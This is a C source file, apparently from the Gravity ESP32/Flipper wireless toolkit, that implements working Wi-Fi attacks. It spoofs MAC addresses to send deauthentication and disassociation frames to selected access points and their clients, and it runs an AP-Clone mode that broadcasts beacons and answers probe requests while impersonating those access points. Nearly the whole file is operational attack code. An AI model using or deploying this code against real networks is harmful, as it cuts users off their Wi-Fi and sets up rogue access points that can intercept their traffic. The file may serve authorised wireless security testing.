#include "dos.h"
#include "beacon.h"
#include "esp_err.h"
#include "probe.h"
#include "common.h"

const char *DOS_TAG = "dos@GRAVITY";
const uint8_t INNOCENT_MAC_BYTES[] = { 0xA6, 0x04, 0x60, 0x22, 0x1A, 0xB2 };
const char INNOCENT_MAC_STR[] = "A6:04:60:22:1A:B2";
static PROBE_RESPONSE_AUTH_TYPE currentAuthType = 0;

/* Start/Stop AP-Clone
   Frustratingly, this is the second time I've written this function
   Handle the start/stop of AP-Clone
   This is a composite attack that:
   * Enables AP-DOS: Deauthentication and disassociation attacks on
                     selectedAPs and their STAs
   * Enables Beacon: Broadcast beacon frames advertising selectedAPs
   * Responds to probe requests with selectedAPs
*/
esp_err_t cloneStartStop(bool isStarting, int useAuthType) {
    /* Reject startup if no selectedAPs */
    if (isStarting && gravity_sel_ap_count == 0) {
        #ifdef CONFIG_FLIPPER
            printf("Not starting AP-Clone, no selectedAPs.\nPlease select one or more APs first.\n");
        #else
            ESP_LOGE(DOS_TAG, "Not starting AP-Clone, no selectedAPs. Please select one or more APs first.");
        #endif
        return ESP_ERR_INVALID_ARG;
    }
    esp_err_t res = ESP_OK;

    currentAuthType = useAuthType;

    /* Update attack_status[] */
    attack_status[ATTACK_AP_CLONE] = isStarting;
    attack_status[ATTACK_AP_DOS] = isStarting;
    attack_status[ATTACK_BEACON] = isStarting;

    /* Start/stop hopping task loop if hopping is on by default for included features */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
         res |= cmd_hop(2, args);
    } else {
        args[1] = "off";
        res |= cmd_hop(2, args);
    }

    /* Initialise/Clean-up Beacon attack as required */
    if (isStarting) {
        // TODO: authType properly
        res |= beacon_start(ATTACK_BEACON_AP, (int *)&currentAuthType, 1, 0);
    } else {
        res |= beacon_stop();
    }

    /* Sending probe responses in response to relevant
       requests is handled by dosParseFrame() */

    return res;
}

/* Final parsing of wireless frame prior to calling the deauth module to send the packet */
/* If thisAP is not NULL this function sends a deauth packet to its
   STA with the MAC of the AP and a disassoc packet to the AP with the MAC of the STA.
   If thisSTA is not NULL the function sends a deauth packet to both
   STAs, using the MAC of the AP.
*/
esp_err_t dosSendDeauth(uint8_t *srcAddr, uint8_t *destAddr, ScanResultAP *thisAP, ScanResultSTA *thisSTA) {
    uint8_t deauthSrc[6], deauthDest[6];
    /* Make sense of our parameters */
    if (thisAP != NULL) {
        /* Packet goes to or from an AP. Figure out whether srcAddr or destAddr is our STA */
        if (!memcmp(srcAddr, thisAP->espRecord.bssid, 6)) {
            /* Packet was from AP -> STA -- We want the same for deauth */
            memcpy(deauthSrc, srcAddr, 6);
            memcpy(deauthDest, destAddr, 6);
        } else if (!memcmp(destAddr, thisAP->espRecord.bssid, 6)) {
            /* Packet was STA -> AP --- Swap order for deauth */
            memcpy(deauthSrc, destAddr, 6);
            memcpy(deauthDest, srcAddr, 6);
        }

        #ifdef CONFIG_DEBUG_VERBOSE
            char strSrc[MAC_STRLEN + 1];
            char strDest[MAC_STRLEN + 1];
            mac_bytes_to_string(deauthSrc, strSrc);
            mac_bytes_to_string(deauthDest, strDest);
            #ifdef CONFIG_FLIPPER
                printf("Setting MAC to %s\n", strSrc);
            #else
                ESP_LOGI(DOS_TAG, "Setting MAC to %s", strSrc);
            #endif
        #endif
        /* Set MAC to deauthSrc */
        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthSrc) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("%sfor DOS Deauth, continuing\n", STRINGS_SET_MAC_FAIL);
            #else
                ESP_LOGW(DOS_TAG, "%s(%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", STRINGS_SET_MAC_FAIL, deauthSrc[0], deauthSrc[1], deauthSrc[2], deauthSrc[3], deauthSrc[4], deauthSrc[5]);
            #endif
        }
        vTaskDelay(1);

        #ifdef CONFIG_DEBUG_VERBOSE
            #ifdef CONFIG_FLIPPER
                printf("Deauth to %s\n", strDest);
            #else
                ESP_LOGI(DOS_TAG, "Deauth to %s", strDest);
            #endif
        #endif

        /* Call deauth module here */
        deauth_standalone_packet(deauthSrc, deauthDest);
        /* Now set the MAC to STA's and send disassoc to AP */
        /* Check if it's broadcast first */
        if (memcmp(deauthDest, BROADCAST, 6) && esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthDest) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("%sfor disassoc, continuing\n", STRINGS_SET_MAC_FAIL);
            #else
                ESP_LOGW(DOS_TAG, "%s(%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", STRINGS_SET_MAC_FAIL, deauthDest[0], deauthDest[1], deauthDest[2], deauthDest[3], deauthDest[4], deauthDest[5]);
            #endif
        }
        vTaskDelay(1);
        #ifdef CONFIG_DEBUG_VERBOSE
            #ifdef CONFIG_FLIPPER
                printf("Disassoc to %s\n", strSrc);
            #else
                ESP_LOGI(DOS_TAG, "Disassoc to %s", strSrc);
            #endif
        #endif
        disassoc_standalone_packet(deauthDest, deauthSrc);
    } else {
        /* Packet goes to or from a scanned station */
        /* In this instance we'll deauth both the identified and unknown STAs */
        /* Set the MAC first this time */
        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, thisSTA->apMac) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("%sin DOS STA\n", STRINGS_SET_MAC_FAIL);
            #else
                ESP_LOGW(DOS_TAG, "%sin DOS STA\n", STRINGS_SET_MAC_FAIL);
            #endif
        }
        vTaskDelay(1);
        for (int z = 0; z < 2; ++z) {
            if (z == 0) {
                memcpy(deauthSrc, srcAddr, 6);
                memcpy(deauthDest, destAddr, 6);
            } else {
                memcpy(deauthSrc, destAddr, 6);
                memcpy(deauthDest, srcAddr, 6);
            }

            #ifdef CONFIG_DEBUG_VERBOSE
                #ifdef CONFIG_FLIPPER
                    printf("Deauth from %s to %s\n", deauthSrc, deauthDest);
                #else
                    ESP_LOGI(DOS_TAG, "Deauth from %s to %s", deauthSrc, deauthDest);
                #endif
            #endif

            /* Call deauth module here */
            deauth_standalone_packet(deauthSrc, deauthDest);
        }
    }
    return ESP_OK;
}

/* Inspect an observed probe request & send probe response(s) as appropriate
   This function will be called as required by dosParseFrame, there are probably
   no cases where it's a good idea to call it yourself.
   The function will inspect the provided probe request. If the request is
   addressed to broadcast or a selectedAP, and is for wildcard SSIDs or the
   SSID of a selectedAP, a probe response will be sent for the specified AP(s)
*/
esp_err_t cloneProbeRequest(uint8_t *payload) {
    if (payload[0] != WIFI_FRAME_PROBE_REQ) {
        ESP_LOGE(DOS_TAG, "Frame is not a probe request");
        return ESP_ERR_INVALID_ARG;
    }

    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t ssid[MAX_SSID_LEN];
    char *strSsid;
    memcpy(destAddr, &payload[PROBE_DESTADDR_OFFSET], 6);
    memcpy(srcAddr, &payload[PROBE_SRCADDR_OFFSET], 6);
    memset(ssid, '\0', MAX_SSID_LEN);
    memcpy(ssid, &payload[PROBE_SSID_OFFSET], payload[PROBE_SSID_OFFSET - 1]);
    strSsid = malloc(sizeof(char) * (payload[PROBE_SSID_OFFSET - 1] + 1));
    if (strSsid == NULL) {
        #ifdef CONFIG_FLIPPER
            printf("%sfor a string SSID\n", STRINGS_MALLOC_FAIL);
        #else
            ESP_LOGE(DOS_TAG, "%sto calculate a string representation of SSID", STRINGS_MALLOC_FAIL);
        #endif
        return ESP_ERR_NO_MEM;
    }
    memcpy(strSsid, ssid, payload[PROBE_SSID_OFFSET - 1]);
    strSsid[payload[PROBE_SSID_OFFSET - 1]] = '\0';

    char srcStr[MAC_STRLEN + 1];
    char destStr[MAC_STRLEN + 1];
    mac_bytes_to_string(srcAddr, srcStr);
    mac_bytes_to_string(destAddr, destStr);
    #ifdef CONFIG_DEBUG
        #ifdef CONFIG_FLIPPER
            printf("%s probe req for\n%25s\n", (memcmp(destAddr, BROADCAST, 6))?"Directed":"Wildcard", ssid);
        #else
            ESP_LOGI(DOS_TAG, "Processing %s probe request from %s to %s for \"%s\"", (memcmp(destAddr, BROADCAST, 6))?"Directed":"Wildcard", srcStr, destStr, (char *)ssid);
        #endif
    #endif

    /* Is it for me (i.e. wildcard or a selectedAP SSID)? */
    bool willRespond = (strlen(strSsid) == 0); /* true for empty SSID (wildcard) */
    int i = gravity_sel_ap_count;
    if (!willRespond) {
        for (i = 0; i < gravity_sel_ap_count && strcasecmp(strSsid, (char *)gravity_selected_aps[i]->espRecord.ssid); ++i) { }
        willRespond = (i < gravity_sel_ap_count);
    }

    /* Leave unless you're a wildcard request or directed to one of the selected SSIDs */
    if (!willRespond) {
        free(strSsid);
        return ESP_OK;
    }

    /* Until this point we haven't considered the intended destination
       As a bit of a sanity check let's compare the frame's destination, which should be an AP,
       with the MAC recorded for the matching selectedAP, and report if they are different
    */
    if (i < gravity_sel_ap_count) {
        if (memcmp(destAddr, gravity_selected_aps[i]->espRecord.bssid, 6)) {
            ESP_LOGI(DOS_TAG, "AP record and destAddr %s do not match", destStr);
        }
        /* Set MAC */
        if (gravity_set_mac(destAddr) != ESP_OK) {
            #ifdef CONFIG_FLIPPER
                printf("%sto %s\n", STRINGS_SET_MAC_FAIL, strSsid);
            #else
                ESP_LOGW(DOS_TAG, "%sto %s", STRINGS_SET_MAC_FAIL, strSsid);
            #endif
        }
        vTaskDelay(1);
        send_probe_response(destAddr, srcAddr, strSsid, AUTH_TYPE_NONE, 0); // TODO: Decide on AUTH approach
    } else {
        for (i = 0; i < gravity_sel_ap_count; ++i) {
            // TODO: AUTH
            if (gravity_set_mac(gravity_selected_aps[i]->espRecord.bssid) != ESP_OK) {
                #ifdef CONFIG_FLIPPER
                    printf("%sfrom selectedAP\n", STRINGS_SET_MAC_FAIL);
                #else
                    ESP_LOGW(DOS_TAG, "%sfrom selectedAP", STRINGS_SET_MAC_FAIL);
                #endif
            }
            vTaskDelay(1);
            send_probe_response(gravity_selected_aps[i]->espRecord.bssid, srcAddr, (char *)gravity_selected_aps[i]->espRecord.ssid, AUTH_TYPE_NONE, 0);
        }
    }

    free(strSsid);
    return ESP_OK;
}

/* Display the status of the DOS attack */
esp_err_t dos_display_status() {
    esp_err_t err = ESP_OK;

    #ifdef CONFIG_FLIPPER
        printf("Gravity DOS: %s\nGravity selectedAPs: %d\n", attack_status[ATTACK_AP_DOS]?"ACTIVE":"INACTIVE", gravity_sel_ap_count);
        if (gravity_sel_ap_count > 0) {
            gravity_list_ap(gravity_selected_aps, gravity_sel_ap_count, false);
        }
    #else
        ESP_LOGI(DOS_TAG, "DOS: %s\nGravity selectedAPs: %d\n", attack_status[ATTACK_AP_DOS]?"Active":"Inactive", gravity_sel_ap_count);
        if (gravity_sel_ap_count > 0) {
            gravity_list_ap(gravity_selected_aps, gravity_sel_ap_count, false);
        }
    #endif

    return err;
}

/* Display the status of the clone attack */
esp_err_t clone_display_status() {
    esp_err_t err = ESP_OK;

    #ifdef CONFIG_FLIPPER
        printf("Gravity Clone: %s\nGravity selectedAPs: %d\n", attack_status[ATTACK_AP_CLONE]?"ACTIVE":"INACTIVE", gravity_sel_ap_count);
        if (gravity_sel_ap_count > 0) {
            gravity_list_ap(gravity_selected_aps, gravity_sel_ap_count, false);
        }
    #else
        ESP_LOGI(DOS_TAG, "Clone: %s\nGravity selectedAPs: %d\n", attack_status[ATTACK_AP_CLONE]?"Active":"Inactive", gravity_sel_ap_count);
        if (gravity_sel_ap_count > 0) {
            gravity_list_ap(gravity_selected_aps, gravity_sel_ap_count, false);
        }
    #endif

    return err;
}

/* Determine whether we need to do anything in response to the current frame */
/* This function provides an implementation supporting both AP-DOS and AP-Clone.
   AP-Clone needs to behave as a regular AP for the AP(s) it is emulating,
   including responding appropriately to both wildcard and directed probe
   requests. This behaviour is *almost* the same as Mana's, but customising
   Mana's functionality to support this use case would have been less elegant
   than just about any other option I can think of.
   If this function identifies a probe request while AP-Clone is running it
   will call out to cloneProbeRequest(payload)
*/
esp_err_t dosParseFrame(uint8_t *payload) {
    uint8_t srcAddr[6];
    uint8_t destAddr[6];
    esp_err_t err = ESP_OK;

    /* AP-DOS and AP-Clone both require at least one selectedAP */
    if (gravity_sel_ap_count == 0) {
        return ESP_OK;
    }

    /* If AP-Clone is running and it's a probe request pass it to AP-Clone */
    if (attack_status[ATTACK_AP_CLONE] && payload[0] == WIFI_FRAME_PROBE_REQ) {
        err |= cloneProbeRequest(payload);
    }

    memcpy(destAddr, &payload[4], 6);
    memcpy(srcAddr, &payload[10], 6);

    /* Is the SRC or DEST a selectedAP? */
    int i;
    for (i = 0; i < gravity_sel_ap_count && memcmp(destAddr, gravity_selected_aps[i]->espRecord.bssid, 6) && memcmp(srcAddr, gravity_selected_aps[i]->espRecord.bssid, 6); ++i) { }
 
    if (i < gravity_sel_ap_count) {
        /* Found the AP */

        /* Send deauth packet to other end */
        dosSendDeauth(srcAddr, destAddr, gravity_selected_aps[i], NULL);
    } else {
        /* Not an AP. See if it's a STA */
        int cliCount = 0;
        ScanResultSTA **allClients = collateClientsOfSelectedAPs(&cliCount);
        for (i = 0; i < cliCount && memcmp(destAddr, allClients[i]->mac, 6) &&
                memcmp(srcAddr, allClients[i]->mac, 6); ++i) { }
        if (i < cliCount) {
            /* Found one of selectedAPs' STA's - deauth it */
            dosSendDeauth(srcAddr, destAddr, NULL, allClients[i]);
        } else {
            #ifndef CONFIG_FLIPPER
                char src[MAC_STRLEN + 1], dest[MAC_STRLEN + 1];
                mac_bytes_to_string(destAddr, dest);
                mac_bytes_to_string(srcAddr, src);
                ESP_LOGI(DOS_TAG, "Ignoring packet [ %s ] => [ %s ]", src, dest);
            #endif
        }
        free(allClients);
    }
    return err;
}